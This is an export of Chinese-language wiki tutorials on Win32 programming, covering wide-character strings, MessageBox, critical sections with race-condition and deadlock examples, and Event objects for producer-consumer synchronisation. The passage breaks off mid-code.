获取字符串长度 123456789101112#include &lt;Windows.h&gt;int main()&#123; char szStr[] = &quot;China&quot;; // 占6个字节，长度是5 wchar_t swzStr[] = L&quot;China&quot;; // 占12个字节，长度也是5，因为宽字符两字节算1个 int iLengthOfsz = strlen(szStr); // 取得多字节字符串中字符长度，不包含 00 int iLengthOfswz = wcslen(swzStr); // 取得宽字节字符串中字符长度，不包含 00 00 return 0;&#125;"},{"title":"Win32 API中的宽字符","path":"/wiki/Windows_API/Win32_API中的宽字符.html","content":"知识补充 什么是Win32 API？有哪些？在哪里？ Win32 API(Application Programming Interface)，是Windows操作系统提供给我们的函数（应用编程接口）。它们是存放在系统目录下的一些dll。 如果是32位系统，位于C:\\Windows\\System32下的dll 如果是64位系统： 32位的dll存放于C:\\Windows\\SysWOW64 64位的dll存放于C:\\Windows\\System32 重要的DLL文件： Kernel32.dll：最核心的功能模块，例如内存管理、进程线程相关的函数等； User32.dll：Windows用户界面相关的应用程序接口，例如创建窗口、发送信息等； GDI32.dll：全称是Graphical Device Interface（图形设备接口），包含用于画图和显示文本的函数。 实际上，Kernel32.dll、User32.dll和GDI32.dll等dll文件是给开发者提供一个接口来调用真正的内核函数，它们是一个过渡，一个接口而已。真正的函数实现在内核中，内核函数通常以Nt或Zw开头 在C语言编程中，包含Windows.h头文件即可使用这些API win32中的数据类型 win32将汇编、C、C++中已有的数据类型用#define起了别名，好处： 统一风格，增强代码可读性。因为汇编、C、C++的开发人员都可以调用win32api，让这些数据类型统一名字，让大家的代码风格更统一清晰。 方便跨平台移植。如果需要将已有的代码移植到别的平台，只需要修改#define重定义那行 在win32中使用字符串 TCHAR和TEXT是宏，会根据当前IDE项目的字符集替换为相应字符集 123#define TEXT(quote) __TEXT(quote) // r_winnt#define __TEXT(quote) L##quote // r_winnt 12345678910//// Neutral ANSI/UNICODE types and macros//#ifdef UNICODE // r_winnt#ifndef _TCHAR_DEFINEDtypedef WCHAR TCHAR, *PTCHAR;typedef WCHAR TBYTE , *PTBYTE ;#define _TCHAR_DEFINED#endif /* !_TCHAR_DEFINED */ 字符类型12345678910#include &lt;Windows.h&gt;int main() &#123; CHAR szStr[] = &quot;中国&quot;; // ANSI字符集 WCHAR swzStr[] = L&quot;中国&quot;; // Unicode字符集 TCHAR stzSr[] = TEXT(&quot;中国&quot;); //如果项目是ASNI字符集，则替换为CHAR类型 //如果项目是Unicode字符集，则替换为WCHAR类型 return 0;&#125; PTSTR也是宏，也是自适应 123typedef LPWSTR PTSTR, LPTSTR;typedef _Null_terminated_ WCHAR *NWPSTR, *LPWSTR, *PWSTR; 字符串指针12345678910#include &lt;Windows.h&gt;int main() &#123; PSTR pszStr = &quot;中国&quot;; // char* PWSTR pwszStr = L&quot;中国&quot;; // wchar_t* PTSTR ptszStr = TEXT(&quot;中国&quot;); // PTSTR 根据当前项目使用的字符集自动换成char*或wchar_t* return 0;&#125; MessageBox win32api都有两个版本： 一个窄字符版本，函数名以A结尾 一个宽字符版本，函数名以W结尾 以MessageBox为例： 12345#ifdef UNICODE#define MessageBox MessageBoxW#else#define MessageBox MessageBoxA#endif // !UNICODE 如果使用窄字符，应该使用函数名以A结尾的版本；如果使用宽字符，应该使用函数名以W结尾的版本。 实际上，windows内核使用的都是宽字符的。开发者如果使用A版本的函数，api调用到系统内核时需要先转换为宽字符版本；而如果直接使用W版本的函数，就不需要转换，性能会好一些。 123456int MessageBox( [in, optional] HWND hWnd, [in, optional] LPCTSTR lpText, [in, optional] LPCTSTR lpCaption, [in] UINT uType); hWnd：表示这个窗口属于谁，谁也不属于，填NULL lpText：弹出窗口显示的内容 lpCaption：弹出窗口的标题 uType：弹出窗口的类型 A版本123CHAR strAsciiTitle[] = &quot;Title&quot;;CHAR strAsciiContent[] = &quot;Hello World!&quot;;MessageBoxA(0, strAsciiContent, strAsciiTitle, MB_OK); W版本123WCHAR strWideTitle[] = L&quot;Title&quot;;WCHAR strWideContent[] = L&quot;Hello World!&quot;;MessageBoxW(0, strWideContent, strWideTitle, MB_OK); 宏定义版本123TCHAR strGenericTitle[] = TEXT(&quot;Title&quot;);TCHAR strGenericContent[] = TEXT(&quot;Hello World!&quot;);MessageBox(0, strGenericContent, strGenericTitle, MB_OK);"},{"title":"临界区（Critical Section）","path":"/wiki/Windows_API/临界区.html","content":"前言 每个线程都有自己的栈（局部变量存储的地方），这些局部变量是线程自己独有的，影响不到别的线程。但全局变量是所有线程都可以访问到的。如果多个线程都访问自己堆栈中的局部变量，不访问全局变量，那就没有线程安全的问题；即使多个线程访问了全局变量，但都是读的操作，没有写的操作，也不存在线程安全问题。只有“多个线程访问同一个全局变量，并且有写的操作”这种情况下才存在多线程安全问题。 例 起两个线程同时卖票，g_countNumber表示票的总数 123456789101112131415161718192021222324252627282930313233343536#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int g_countNumber = 10; //票的总数DWORD WINAPI ThreadProc(LPVOID lpParameter) //参数用来标记是哪个线程执行&#123; int threadId = *(int*)lpParameter; while (g_countNumber &gt; 0) &#123; printf(&quot;Thread ID: %d, Tickets before selling: %d &quot;, threadId, g_countNumber); // 售卖前剩多少张票 g_countNumber--; // 票总数减1 printf(&quot;Thread ID: %d, Tickets after selling: %d &quot;, threadId, g_countNumber); // 售卖后剩多少张票 &#125; return 0;&#125;int main(int argc, char* argv[])&#123; HANDLE hThread; int threadId1 = 1; hThread = CreateThread(NULL, NULL, ThreadProc, &amp;threadId1, 0, NULL); HANDLE hThread1; int threadId2 = 2; hThread1 = CreateThread(NULL, NULL, ThreadProc, &amp;threadId2, 0, NULL); WaitForSingleObject(hThread, INFINITE); WaitForSingleObject(hThread1, INFINITE); CloseHandle(hThread); CloseHandle(hThread1); getchar(); return 0;&#125; 执行后发现票卖到了-1张。 因为线程的切换是随机的。假设剩最后1张票（g_countNumber = 1）。1号线程判断g_countNumber &gt; 0进入while循环体，此时可能发生了线程的切换，切到2号线程执行，2号线程也执行了判断，并且卖出了票，并让票数减1，此时g_countNumber = 0。然后回到1号线程，继续卖票，减票，这就让g_countNumber减到负数了。 临界区 在解决上述问题前，引入两个概念： 临界资源：一次只允许一个线程使用的资源 临界区：访问临界资源的那部分代码 我们可以通过这样的方式来控制临界区的访问：只有拿到了令牌的线程才能访问全局变量X。那么可能发生的场景如下：假设线程1拿了这块令牌。如果此时发生切换，切到线程2，线程2判断令牌是否被拿走，是，那么线程2没法继续执行。直到线程1归还了令牌，其他线程才能拿这块令牌，才能访问全局变量X。（令牌在这里就是一块内存，0表示有人拿走了，目前令牌被占用，1表示目前令牌可用）。 自己实现令牌的实现还需要考虑一些细节，比如当线程1判断令牌是否还在时，还在，结果切到线程2，线程2也判断令牌还在，可能出现两个线程都拿了令牌。（其实让判断令牌和拿令牌的操作是原子操作即可）。在这里我们直接windows提供的api，在当前阶段知道这个api是安全的，防止了上述情况的发生就够了。 临界区锁 临界区锁是控制临界区的一种方式。 创建全局变量：CRITICAL_SECTION cs; 初始化全局变量：InitializeCriticalSection(&amp;cs); 实现临界区 123EnterCriticalSection(&amp;cs); //进入临界区//使用临界资源LeaveCriticalSection(&amp;cs); //离开临界区 相关函数1234567891011// 初始化临界区对象资源void InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection); // 进入临界区void EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection); // 离开临界区void LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection); // 删除临界区对象资源void DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection); 用线程锁解决上面卖票的问题，在临界区前后加Enter和Leave临界区。 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int g_countNumber = 10;+ CRITICAL_SECTION cs;DWORD WINAPI ThreadProc(LPVOID lpParameter) //参数用来标记哪个线程执行&#123; int threadId = *(int*)lpParameter; while (g_countNumber &gt; 0) &#123;+ EnterCriticalSection(&amp;cs); //进入临界区 printf(&quot;Thread ID: %d, Tickets before selling: %d &quot;, threadId, g_countNumber); // 售卖前剩多少张票 g_countNumber--; // 票总数减1 printf(&quot;Thread ID: %d, Tickets after selling: %d &quot;, threadId, g_countNumber); // 售卖后剩多少张票+ LeaveCriticalSection(&amp;cs); //离开临界区 &#125; return 0;&#125;int main(int argc, char* argv[])&#123;+ InitializeCriticalSection(&amp;cs); //初始化临界区资源 HANDLE hThread; int threadId1 = 1; hThread = CreateThread(NULL, NULL, ThreadProc, &amp;threadId1, 0, NULL); HANDLE hThread1; int threadId2 = 2; hThread1 = CreateThread(NULL, NULL, ThreadProc, &amp;threadId2, 0, NULL); WaitForSingleObject(hThread, INFINITE); WaitForSingleObject(hThread1, INFINITE); CloseHandle(hThread); CloseHandle(hThread1);+ DeleteCriticalSection(&amp;cs); //删除临界区资源 getchar(); return 0;&#125; 但修改后的这段代码实际上还存在线程安全问题。因为检查g_countNumber的代码不在临界区中。具体来看，问题出现在这样一个场景中： 假设g_countNumber当前为1。 线程1通过g_countNumber &gt; 0的检查。 线程1进入临界区之前，它的时间片用完了，切到线程2。 线程2同样通过g_countNumber &gt; 0的检查，然后进入临界区，减少g_countNumber，此时g_countNumber变为0，退出临界区。线程2结束，切到线程1 线程1再次获得执行，进入临界区，减少g_countNumber，此时g_countNumber变为-1。 所以如果想确保线程安全，需要把对全局变量所有的判断，读写都放在临界区里。 再次修改代码： 将对g_countNumber的检查也放入临界区中12345678910111213141516171819DWORD WINAPI ThreadProc(LPVOID lpParameter)&#123; int threadId = *(int*)lpParameter; while (TRUE) // 修改为无限循环 &#123; EnterCriticalSection(&amp;cs); //进入临界区 if (g_countNumber &lt;= 0) &#123; // 检查是否还有票 LeaveCriticalSection(&amp;cs); // 没有票了，离开临界区，归还令牌 break; // 退出循环 &#125; //还有票，卖票 printf(&quot;Thread ID: %d, Tickets before selling: %d &quot;, threadId, g_countNumber); g_countNumber--; printf(&quot;Thread ID: %d, Tickets after selling: %d &quot;, threadId, g_countNumber); LeaveCriticalSection(&amp;cs); //离开临界区 &#125; return 0;&#125; 另一种改法对临界资源的检查（g_countNumber &gt; 0）也包括进临界区。1234567891011121314DWORD WINAPI ThreadProc(LPVOID lpParameter) //参数用来标记哪个线程执行&#123; int threadId = *(int*)lpParameter; EnterCriticalSection(&amp;cs); //进入临界区 while (g_countNumber &gt; 0) &#123; printf(&quot;Thread ID: %d, Tickets before selling: %d &quot;, threadId, g_countNumber); // 售卖前剩多少张票 g_countNumber--; // 票总数减1 printf(&quot;Thread ID: %d, Tickets after selling: %d &quot;, threadId, g_countNumber); // 售卖后剩多少张票 &#125; LeaveCriticalSection(&amp;cs); //离开临界区 return 0;&#125;这种方式也做好了临界资源的互斥控制。但有一个问题，因为进入临界区和离开临界区几乎包住了整个线程函数，导致无法发挥多线程的优势。虽然从感觉上程序效率也没比上面用while(TRUE)高多少。这可能是因为在这个例子中，线程函数的代码比较少，所以体现不出优势。但代码量较多时，差异就会体现出来。 CRITICAL_SECTION结构体成员 调度程序就是根据这个结构体中成员的值来知道临界区的使用情况 12345678typedef struct _RTL_CRITICAL_SECTION &#123; PRTL_CRITICAL_SECTION_DEBUG DebugInfo; LONG LockCount; //锁计数（或锁定计数） LONG RecursionCount; //递归计数 HANDLE OwningThread; //线程ID，表示持有临界区的线程 HANDLE LockSemaphore; DWORD SpinCount;&#125; RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION; LockCount：表示临界区是否被占用 通常初始化为-1。当这个值等于或大于0时，表示该临界区已被某个线程占用 RecursionCount：记录当前占用临界区的线程已经获得该临界区的次数。 如果同一个线程多次调用 EnterCriticalSection，这个计数器会递增。它允许同一个线程在已经持有临界区的情况下递归地进入临界区，而不会导致死锁。 等待获得临界区的线程数：LockCount -（RecursionCount-1） OwningThread：当前持有临界区的线程的标识符。 这个标识符与 GetCurrentThreadId 函数返回的线程 ID 是相同的。 例 VC版VS版123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;CRITICAL_SECTION cs;DWORD WINAPI ThreadProc(LPVOID lpParameter)&#123; int threadNum = (int)(size_t)lpParameter; for (int x = 0; x &lt; 5; x++) &#123; EnterCriticalSection(&amp;cs); Sleep(100); printf(&quot;Thread %d: LockCount=%x RecursionCount=%x OwningThread=%x &quot;, threadNum, cs.LockCount, cs.RecursionCount, cs.OwningThread); LeaveCriticalSection(&amp;cs); &#125; return 0;&#125;int main(int argc, char* argv[])&#123; InitializeCriticalSection(&amp;cs); printf(&quot;Main Thread:%x %x %x &quot;, cs.LockCount, cs.RecursionCount, cs.OwningThread); // 创建多个线程，每个线程传入自己的编号 HANDLE threads[4]; for (int i = 0; i &lt; 4; i++) &#123; threads[i] = CreateThread(NULL, 0, ThreadProc, (LPVOID)(size_t)(i + 1), 0, NULL); &#125; // 等待所有线程结束 WaitForMultipleObjects(4, threads, TRUE, INFINITE); // 关闭线程句柄 for (i = 0; i &lt; 4; i++) &#123; CloseHandle(threads[i]); &#125; DeleteCriticalSection(&amp;cs); return 0;&#125; 线程函数中没有递归，LockCount -（RecursionCount-1），1-1是0，LockCount就表示等待线程数； 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;CRITICAL_SECTION cs;DWORD WINAPI ThreadProc(LPVOID lpParameter)&#123; int threadNum = (int)(size_t)lpParameter; for (int x = 0; x &lt; 5; x++) &#123; EnterCriticalSection(&amp;cs); Sleep(100); printf(&quot;Thread %d: LockCount=%ld RecursionCount=%ld OwningThread=%x &quot;, threadNum, (long)cs.LockCount, (long)cs.RecursionCount, cs.OwningThread); LeaveCriticalSection(&amp;cs); &#125; return 0;&#125;int main(int argc, char* argv[])&#123; InitializeCriticalSection(&amp;cs); printf(&quot;Main Thread:%ld %ld %x &quot;, (long)cs.LockCount, (long)cs.RecursionCount, cs.OwningThread); // 创建多个线程，每个线程传入自己的编号 HANDLE threads[4]; for (int i = 0; i &lt; 4; i++) &#123; threads[i] = CreateThread(NULL, 0, ThreadProc, (LPVOID)(size_t)(i + 1), 0, NULL); &#125; // 等待所有线程结束 WaitForMultipleObjects(4, threads, TRUE, INFINITE); // 关闭线程句柄 for (int i = 0; i &lt; 4; i++) &#123; CloseHandle(threads[i]); &#125; DeleteCriticalSection(&amp;cs); return 0;&#125; 不清楚为啥VS下步长会不一样。mark，后面有空再研究 尝试过程：OD中步进InitializeCriticalSection，会跟进ntdll中，没有进内核，在ntdll中处理完就出来了。估计是xp和win10系统不同，InitializeCriticalSection，EnterCriticalSection，LeaveCriticalSection函数具体实现变了。对比下两个系统中ntdll的代码实现。 另外，因为临界区不是内核对象，=&gt;所以不会进内核。 如何合理使用临界区 场景1 线程A12345678910111213DWORD WINAPI 线程A(PVOID lpParameter)&#123; EnterCriticalSection(&amp;cs); while (g_nIndex &lt; MAX_TIMES) &#123; //...对临界资源X的操作 &#125; LeaveCriticalSection(&amp;cs); return 0;&#125; 线程B12345678910111213DWORD WINAPI 线程B(PVOID lpParameter)&#123; EnterCriticalSection(&amp;cs); while (g_nIndex &lt; MAX_TIMES) &#123; //...对临界资源X的操作 &#125; LeaveCriticalSection(&amp;cs); return 0;&#125; 分析 上面的EnterCriticalSection和LeaveCriticalSection将大量非临界区代码放在临界区内，而实际上线程A的while中可能只有1%的代码是在操作临界资源。这个场景还比较特殊，EnterCriticalSection放在整个线程函数开头，LeaveCriticalSection放在函数结尾。假设线程A进入临界区后，线程B没法进入，只能等待线程A离开临界区后才能进入。程序这样写，会使得只能有一个线程在运行，无法发挥出多线程的优势，程序效率低。 解决办法 将Enter和Leave的代码紧挨着访问临界资源的代码的前后 线程A123456789101112DWORD WINAPI 线程A(PVOID lpParameter)&#123; while (g_nIndex &lt; MAX_TIMES) &#123; EnterCriticalSection(&amp;cs); //...对临界资源X的操作 LeaveCriticalSection(&amp;cs); &#125; return 0;&#125; 线程B123456789101112DWORD WINAPI 线程B(PVOID lpParameter)&#123; while (g_nIndex &lt; MAX_TIMES) &#123; EnterCriticalSection(&amp;cs); //...对临界资源X的操作 LeaveCriticalSection(&amp;cs); &#125; return 0;&#125; 场景2 线程A123456789101112DWORD WINAPI 线程A(PVOID lpParameter)&#123; EnterCriticalSection(&amp;cs); //代码xxxxxx //代码xxxxxx //...对临界资源X的操作 //代码xxxxxx //代码xxxxxx LeaveCriticalSection(&amp;cs);&#125; 线程B123456789101112DWORD WINAPI 线程B(PVOID lpParameter)&#123; EnterCriticalSection(&amp;cs); //代码xxxxxx //代码xxxxxx //...对临界资源X的操作 //代码xxxxxx //代码xxxxxx LeaveCriticalSection(&amp;cs);&#125; 分析 和场景1一样，临界区中包含了多余的代码 解决办法 将临界区只包裹住实际需要保护的临界资源操作 线程A12345678910111213DWORD WINAPI 线程A(PVOID lpParameter)&#123; //代码xxxxxx //代码xxxxxx EnterCriticalSection(&amp;cs); //...对临界资源X的操作 LeaveCriticalSection(&amp;cs); //代码xxxxxx //代码xxxxxx &#125; 线程B12345678910111213DWORD WINAPI 线程BPVOID lpParameter)&#123; //代码xxxxxx //代码xxxxxx EnterCriticalSection(&amp;cs); //...对临界资源X的操作 LeaveCriticalSection(&amp;cs); //代码xxxxxx //代码xxxxxx &#125; 场景1和场景2小结：临界区的进入和离开应紧挨着访问临界资源的代码前后。如果将多余的代码也包含在临界区内，尽管控制了对临界资源的访问冲突，但会降低程序效率。 场景3 线程A123456789101112131415DWORD WINAPI 线程A(PVOID lpParameter)&#123; //代码xxxxxx //代码xxxxxx EnterCriticalSection(&amp;cs); //对临界资源X的操作 LeaveCriticalSection(&amp;cs); //代码xxxxxx //代码xxxxxx return 0;&#125; 线程B12345678910111213DWORD WINAPI 线程B(PVOID lpParameter)&#123; //代码xxxxxx //代码xxxxxx //对临界资源X的操作 //代码xxxxxx //代码xxxxxx return 0;&#125; 分析 线程B可以直接进入临界区不受限制。 解决办法 所有访问临界资源的代码都需要做控制。 应该有几个临界区 1234int X; //临界资源Xint Y; //临界资源Yint Z; //临界资源ZCRITICAL_SECTION g_cs; 线程1123456789DWORD WINAPI ThreadFunc1(PVOID pvParam) &#123; EnterCriticalSection(&amp;g_cs); // 使用X // 使用Y LeaveCriticalSection(&amp;g_cs); return 0;&#125; 线程212345678DWORD WINAPI ThreadFunc2(PVOID pvParam) &#123; EnterCriticalSection(&amp;g_cs); // 使用X // 使用Z LeaveCriticalSection(&amp;g_cs); return 0;&#125; 线程3123456789DWORD WINAPI ThreadFunc3(PVOID pvParam) &#123; EnterCriticalSection(&amp;g_cs); // 使用Y // 使用X LeaveCriticalSection(&amp;g_cs); return 0;&#125; 分析 在上面的代码中，所有线程都使用同一个临界区g_cs。在线程1中，将对X和Y的访问都包含在临界区中，这会导致线程1在访问X时，阻塞其他线程访问Y。如果临界资源X和临界资源Y使用时不需要捆绑起来一块使用，那么当线程1访问临界资源X时，可以让线程3访问临界资源Y。因此，应该为每个临界资源设立单独的临界区。 解决方案 临界资源如果不需要捆绑使用，那设立临界区时，要为每个临界资源单独设立临界区，即有几个临界资源，就设立几个临界区。 123456int X;int Y;int Z;CRITICAL_SECTION g_csX; CRITICAL_SECTION g_csY; CRITICAL_SECTION g_csZ; 线程1123456789101112DWORD WINAPI ThreadFunc1(PVOID pvParam) &#123; EnterCriticalSection(&amp;g_csX); // 使用X LeaveCriticalSection(&amp;g_csX); EnterCriticalSection(&amp;g_csY); // 使用Y LeaveCriticalSection(&amp;g_csY); return 0;&#125; 线程2123456789101112DWORD WINAPI ThreadFunc2(PVOID pvParam) &#123; EnterCriticalSection(&amp;g_csX); // 使用X LeaveCriticalSection(&amp;g_csX); EnterCriticalSection(&amp;g_csZ); // 使用Z LeaveCriticalSection(&amp;g_csZ); return 0;&#125; 线程3123456789101112DWORD WINAPI ThreadFunc3(PVOID pvParam) &#123; EnterCriticalSection(&amp;g_csY); // 使用Y LeaveCriticalSection(&amp;g_csY); EnterCriticalSection(&amp;g_csX); // 使用X LeaveCriticalSection(&amp;g_csX); return 0;&#125; 练习 题目：使用临界区实现一个死锁程序 过程死锁（Deadlock）：两个以上运算单元，双方都在等待对方已持有的资源，在没有外力的作用下，这些线程会一直相互等待，程序没法办继续运行，这种情况就是发生了死锁。这里我们用临界区来模拟线程持有和想要获得的“资源”代码模拟线程A已进入临界区cs1，尝试进入cs2线程B已进入临界区cs2，尝试进入cs1线程A在等待线程B释放cs2，线程B在等待线程A释放cs1，线程A和线程B互相等待，无法继续运行，从而产生死锁12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;windows.h&gt;#include &lt;stdio.h&gt;CRITICAL_SECTION cs1, cs2;DWORD WINAPI ThreadFunc1(LPVOID lpParam) &#123; printf(&quot;Thread 1: Trying to enter cs1 &quot;); EnterCriticalSection(&amp;cs1); printf(&quot;Thread 1: Entered cs1 &quot;); // Simulate some work Sleep(1000); printf(&quot;Thread 1: Trying to enter cs2 &quot;); EnterCriticalSection(&amp;cs2); printf(&quot;Thread 1: Entered cs2 &quot;); LeaveCriticalSection(&amp;cs2); LeaveCriticalSection(&amp;cs1); return 0;&#125;DWORD WINAPI ThreadFunc2(LPVOID lpParam) &#123; printf(&quot;Thread 2: Trying to enter cs2 &quot;); EnterCriticalSection(&amp;cs2); printf(&quot;Thread 2: Entered cs2 &quot;); // Simulate some work Sleep(1000); printf(&quot;Thread 2: Trying to enter cs1 &quot;); EnterCriticalSection(&amp;cs1); printf(&quot;Thread 2: Entered cs1 &quot;); LeaveCriticalSection(&amp;cs1); LeaveCriticalSection(&amp;cs2); return 0;&#125;int main() &#123; HANDLE hThread1, hThread2; // Initialize the critical sections InitializeCriticalSection(&amp;cs1); InitializeCriticalSection(&amp;cs2); // Create two threads hThread1 = CreateThread(NULL, 0, ThreadFunc1, NULL, 0, NULL); hThread2 = CreateThread(NULL, 0, ThreadFunc2, NULL, 0, NULL); // Wait for both threads to complete WaitForSingleObject(hThread1, INFINITE); WaitForSingleObject(hThread2, INFINITE); // Clean up DeleteCriticalSection(&amp;cs1); DeleteCriticalSection(&amp;cs2); CloseHandle(hThread1); CloseHandle(hThread2); return 0;&#125;"},{"title":"事件（Event）","path":"/wiki/Windows_API/事件.html","content":"Windows Event对象 CreateEvent 使用CreateEvent创建事件对象（Event Object）。事件对象有两种状态： signaled state：有信号/授信状态 non signaled state：无信号/无状态 123456HANDLE CreateEventA( // 返回事件对象的句柄 [in, optional] LPSECURITY_ATTRIBUTES lpEventAttributes, // SD 安全属性，包含安全描述符 [in] BOOL bManualReset, // reset type 重置类型 [in] BOOL bInitialState, // initial state 初始化状态 [in, optional] LPCSTR lpName // event object name 事件对象名); lpEventAttributes：SD，安全属性，包含安全描述符，一般设置为NULL bManualReset：重置类型，指示事件对象是手动重置（manual-reset event object）还是自动重置（auto-reset event object） TRUE：手动重置。需要手动调用RestEvent函数将Event对象重置为无信号状态 FALSE：自动重置。Event对象受信后会自动重置为无信号状态 bInitialState：Event事件对象被创建后的初始状态是有信号还是无信号状态 TRUE：有信号，signaled FALSE：无信号，non signaled lpName：Event对象的名称 SetEvent SetEvent将无信号的Event对象设置（Set）为授信状态 1BOOL SetEvent( HANDLE hEvent // handle to event); ReSetEvent ReSetEvent将有信号的Event对象重置（ReSet）为无信号状态 1BOOL ResetEvent( HANDLE hEvent // handle to event); Event对象的“通知”功能 可以发现，Event对象的状态可以通过手动设置或自动重置来通知另一个线程，这样就能进行“通信”，就能用于线程的同步控制。 例 该代码在main函数中创建了三个线程：一个线程负责给变量赋值，另外两个线程负责读取该变量的值。在赋值线程完成赋值操作后，其余两个读取线程才能开始读。这里通过Event对象来通知读取线程读取。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;HANDLE g_hEvent;int g_sharedResource;DWORD WINAPI WriteThreadProc(LPVOID lpParameter)&#123; // 模拟一些写入操作 Sleep(1000); // 模拟耗时操作 g_sharedResource = 42; // 写入操作 printf(&quot;WriteThread: Shared resource updated to %d &quot;, g_sharedResource); // 设置事件对象为有信号状态，通知其他线程 SetEvent(g_hEvent); return 0;&#125;DWORD WINAPI ReadThreadProc(LPVOID lpParameter)&#123; int threadNum = *(int*)lpParameter; // 等待事件对象被设置为有信号状态 WaitForSingleObject(g_hEvent, INFINITE); printf(&quot;ReadThread_%d: Shared resource value is %d &quot;, threadNum, g_sharedResource); return 0;&#125;int main()&#123; // 创建手动重置事件对象 g_hEvent = CreateEvent( NULL, // 使用默认安全属性 TRUE, // 手动重置 FALSE, // 初始为无信号状态 NULL // NULL 匿名对象 ); if (g_hEvent == NULL) &#123; printf(&quot;CreateEvent failed (%d) &quot;, GetLastError()); return 1; &#125; HANDLE hThreads[3]; int threadNums[2] = &#123; 1, 2 &#125;; // 创建写入线程 hThreads[0] = CreateThread(NULL, 0, WriteThreadProc, NULL, 0, NULL); if (hThreads[0] == NULL) &#123; printf(&quot;CreateThread for WriteThread failed (%d) &quot;, GetLastError()); CloseHandle(g_hEvent); return 1; &#125; // 创建读取线程 for (int i = 0; i &lt; 2; ++i) &#123; hThreads[i + 1] = CreateThread(NULL, 0, ReadThreadProc, &amp;threadNums[i], 0, NULL); if (hThreads[i + 1] == NULL) &#123; printf(&quot;CreateThread for ReadThread_%d failed (%d) &quot;, i + 1, GetLastError()); CloseHandle(g_hEvent); return 1; &#125; &#125; // 等待所有线程执行完毕 WaitForMultipleObjects(3, hThreads, TRUE, INFINITE); // 关闭句柄 for (int i = 0; i &lt; 3; ++i) &#123; CloseHandle(hThreads[i]); &#125; CloseHandle(g_hEvent); return 0;&#125; Event对象在主函数中被创建出来，手动重置类型，初始为无信号状态。随后创建了1个写入线程，2个读取线程。写入线程写完临界资源后，SetEvent将Event对象设置为有信号后。2个读取线程才能执行，而不会被阻塞。因为是手动重置类型，某个读取线程得到有信号的Event对象后，Event对象仍是有信号，于是当CPU切到第二个读取线程时也能执行。 输出123WriteThread: Shared resource updated to 42ReadThread_1: Shared resource value is 42ReadThread_2: Shared resource value is 42 从这个例子可以看到Event对象的两个特点： 没有owner的说法。Mutex对象有拥有者的说法，而Event对象没有。 Event对象如果是手动重置类型，一旦手动调用SetEvent置为有信号后，就一直是有信号。某个线程使用WaitForSingleObject等待Event对象有信号后，它不会将这个Event对象修改为无信号。换句话说，Event对象有信号后，这个信号可以被多个线程检测到，即使用Event对象可以同时唤醒多个等待的线程。 生产者与消费者 在之前学习使用临界区锁或互斥体进行互斥控制时，会出现这种情况：线程A离开临界区后，与线程B进入临界区的机会均等，即有可能出现线程A连续多次进入临界区的情况。如果想让线程A和线程B交替执行，那就是做同步控制。同步=互斥+有序。可以看到，临界区锁和互斥体都不能实现同步控制。而事件可以，它可以“通知”另一个线程。 我们以经典的线程同步问题生产者和消费者为例进行讲解。 例 生产者生产后，消费者才能取。下面代码用临界区锁对临界资源做互斥控制。 使用临界区锁进行控制123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;CRITICAL_SECTION g_cs; // 临界区对象，用于保护共享资源的访问int g_Iterations = 10; // 设置生产者和消费者各执行10次int g_Buffer = 0; // 共享资源，表示缓冲区的数据// 生产者线程函数DWORD WINAPI ThreadProducer(LPVOID pM)&#123; for (int i = 0; i &lt; g_Iterations; i++) // 执行10次 &#123; // 进入临界区 EnterCriticalSection(&amp;g_cs); g_Buffer = 1; // 将数据放入缓冲区 printf(&quot;生产者%d将数据%d放入缓冲区 &quot;, GetCurrentThreadId(), g_Buffer); // 离开临界区 LeaveCriticalSection(&amp;g_cs); &#125; return 0;&#125;// 消费者线程函数DWORD WINAPI ThreadConsumer(LPVOID pM)&#123; for (int i = 0; i &lt; g_Iterations; i++) // 执行10次 &#123; // 进入临界区 EnterCriticalSection(&amp;g_cs); g_Buffer = 0; // 将数据从缓冲区取出 printf(&quot;----消费者%d将数据%d从缓冲区取出 &quot;, GetCurrentThreadId(), g_Buffer); // 离开临界区 LeaveCriticalSection(&amp;g_cs); &#125; return 0;&#125;int main(int argc, char* argv[])&#123; // 初始化临界区对象 InitializeCriticalSection(&amp;g_cs); HANDLE hThreads[2]; hThreads[0] = CreateThread(NULL, 0, ThreadProducer, NULL, 0, NULL); // 生产者线程 hThreads[1] = CreateThread(NULL, 0, ThreadConsumer, NULL, 0, NULL); // 消费者线程 WaitForMultipleObjects(2, hThreads, TRUE, INFINITE); CloseHandle(hThreads[0]); CloseHandle(hThreads[1]); // 销毁临界区对象 DeleteCriticalSection(&amp;g_cs); return 0;&#125; 运行输出1234567891011121314151617181920生产者4936将数据1放入缓冲区生产者4936将数据1放入缓冲区生产者4936将数据1放入缓冲区生产者4936将数据1放入缓冲区生产者4936将数据1放入缓冲区生产者4936将数据1放入缓冲区生产者4936将数据1放入缓冲区生产者4936将数据1放入缓冲区生产者4936将数据1放入缓冲区生产者4936将数据1放入缓冲区----消费者41168将数据0从缓冲区取出----消费者41168将数据0从缓冲区取出----消费者41168将数据0从缓冲区取出----消费者41168将数据0从缓冲区取出----消费者41168将数据0从缓冲区取出----消费者41168将数据0从缓冲区取出----消费者41168将数据0从缓冲区取出----消费者41168将数据0从缓冲区取出----消费者41168将数据0从缓冲区取出----消费者41168将数据0从缓冲区取出 因为线程的无序性，出现了生产者出临界区后再次进入临界区的情况。而我们想要的是交替执行：生产者先生产，消费者后消费。 我们会想到用一个标记变量来实现同步控制：生产者是否已生产，如果已生产，就不再生产，消费者同理。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;CRITICAL_SECTION g_cs; // 